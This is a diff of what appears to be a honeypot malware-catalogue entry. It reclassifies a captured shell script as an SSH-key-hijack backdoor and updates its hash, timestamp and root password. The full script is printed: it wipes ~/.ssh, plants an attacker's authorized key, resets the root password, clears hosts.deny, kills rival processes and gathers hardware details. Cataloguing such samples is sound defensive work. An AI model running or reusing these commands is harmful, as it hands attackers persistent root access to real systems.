@@ -1,16 +1,17 @@
-# sha256: 07f25e8487ca4652d1be7893c2da60520dc846aa6c5e32e770f41f01ba72712f
-# family: script_generic
+# sha256: 7a20490568f940285c6882222ba04876fdcc3a64c31f528c21d900175b0f30de
+# family: backdoor
 # kind: script
 # size_bytes: 1050
-# first_seen: 2026-05-21 22:11:15.573359 UTC
+# first_seen: 2026-05-21 23:04:50.633164 UTC
 # times_seen: 1
 # yara_matches: none
+# subtype: ssh_key_hijack - intento de persistencia via SSH (borra/reemplaza authorized_keys), NO malware binario instalado y confirmado
 # ------------------------------------------------------------
 
 cd ~; chattr -ia .ssh; lockr -ia .ssh
 cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
 cat /proc/cpuinfo | grep name | wc -l
-echo "root:U2LRENqVFGxO"|chpasswd|bash
+echo "root:vPVzNuQ5m0WG"|chpasswd|bash
 rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
 cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
 free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
